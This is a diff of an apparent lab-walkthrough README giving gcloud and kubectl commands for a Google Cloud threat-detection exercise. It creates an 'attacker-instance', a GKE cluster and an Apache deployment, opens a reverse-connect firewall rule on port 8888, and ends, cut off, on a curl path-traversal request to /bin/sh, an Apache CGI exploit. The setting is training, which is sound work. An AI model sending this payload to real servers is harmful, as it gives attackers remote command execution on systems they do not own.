@@ -6,7 +6,8 @@
 * In the GCP Console open the Cloud Shell and enter the following commands:
 
 ```
-export ZONE=
+export ZONE=us-central1-c
+REGION=${ZONE::-2}
 ```
 ## Note: Go to "IAM & Admin" > "Audit Logs".
 * Click the findbar and type: "Cloud Resource Manager API"
@@ -15,24 +16,25 @@ export ZONE=
 
 ```
 gcloud services enable securitycenter.googleapis.com --project=$DEVSHELL_PROJECT_ID
-
-sleep 15
+sleep 30
 
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
 
-export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")
-
 gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
+
+gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
+  --member=user:$USER_EMAIL \
+  --role=roles/cloudresourcemanager.projectIamAdmin
 ```
 
 ```
 gcloud compute instances create instance-1 --project=$DEVSHELL_PROJECT_ID --zone=$ZONE --machine-type=e2-medium --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any
-```
 
-```
-gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please like and subscirbe to techcps" --networks="default" --alternative-name-servers="" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
+gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please subscirbe to techcps" --networks="default" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
+
+sleep 45
 ```
 
 ```
@@ -56,21 +58,21 @@ gcloud compute instances create attacker-instance \
 
 
 gcloud compute networks subnets update default \
---region="${ZONE%-*}" \
+--region=$REGION \
 --enable-private-ip-google-access
+sleep 45
+gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet
 ```
 
-## Note: Go to "Compute Engine" > "VM Instances"
-* Click the SSH button on attacker-instance
+## Note: Go to Task 5 & Copy the IP address
 
 ```
-export Task_5_IP=
+Enter IP_on_Task5=
 ```
 
 ```
-export ZONE=
+export ZONE=us-central1-c
 ```
-
 ```
 sudo snap remove google-cloud-cli
 
@@ -94,8 +96,25 @@ gcloud container clusters create test-cluster \
 --num-nodes=1 \
 --master-ipv4-cidr "172.16.0.0/28" \
 --enable-master-authorized-networks \
---master-authorized-networks "10.128.0.0/20"
+--master-authorized-networks "$Enter IP_on_Task5="
+sleep 45
+
+while true; do
+    output=$(kubectl describe daemonsets container-watcher -n kube-system)
+    if [[ $output == *container-watcher-unique-id* ]]; then
+        echo "Found unique ID in the output:"
+        echo "$output"
+        break
+    else
+        echo "Please like share & subscirbe to techcps / If you're cricketlover then follow cricetcps"
+        sleep 15
+    fi
+done
 ```
+
+## Note: This command will take a few minutes to display the output
+
+* After Getting a Output run the following Command
 
 ```
 kubectl create deployment apache-deployment \
@@ -108,16 +127,17 @@ kubectl expose deployment apache-deployment \
 --protocol TCP \
 --port 80
 
+
 NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
 NODE_PORT=$(kubectl get service apache-test-service \
 -o jsonpath={.spec.ports[0].nodePort})
+
 
 gcloud compute firewall-rules create apache-test-service-fw \
 --allow tcp:${NODE_PORT}
 
 gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
 ```
-
 ```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
 --path-as-is \
